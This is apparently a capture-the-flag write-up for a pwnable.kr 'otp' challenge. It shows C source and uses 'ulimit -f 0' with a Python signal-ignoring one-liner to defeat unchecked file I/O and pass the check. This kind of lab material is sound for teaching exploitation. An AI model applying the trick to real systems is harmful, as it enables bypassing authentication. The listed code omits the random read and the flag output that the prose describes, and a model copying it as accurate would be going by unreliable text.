Source code:

#include <stdio.h>

#include <fcntl.h>

int main(int argc, char* argv[]){
	char fname[128];
	unsigned long long otp[2];

	sprintf(fname, "/tmp/%llu", otp[0]);
	FILE* fp = fopen(fname, "w");
	if(fp==NULL){ exit(-1); }
	fwrite(&otp[1], 8, 1, fp);
	fclose(fp);

	printf("OTP generated.\n");

	unsigned long long passcode=0;
	FILE* fp2 = fopen(fname, "r");
	if(fp2==NULL){ exit(-1); }
	fread(&passcode, 8, 1, fp2);
	fclose(fp2);
	
	if(strtoul(argv[1], 0, 16) == passcode){
		printf("Congratz!\n");

	}

	unlink(fname);
	return 0;
}

The program writes a random "password" byte to a random file, the compares the input in argv[1] as hex with the written "password".
If there's a match, the flag is printed.

Note that a failed write or read to the random file aren't checked for - there's no exit in that case but there should be.

We shall use that to prevent reading or writing to a file created by a process created using the current shell.
We'll do so by limiting the file size of such file to 0:

otp@pwnable:~$ ulimit -f 0


Now we have to ignore the SIGXFXZ sent when we exceed that limit.
We'll do so by running ./otp 0 from a subprocess (argv[1] is 0 as the passcode variable will remain 0)

otp@pwnable:~$ python -c "import signal,os; signal.signal(signal.SIGXFSZ,signal.SIG_IGN); os.system('./otp 0')"
OTP generated.
Congratz!
Darn... I always forget to check the return value of fclose() :(
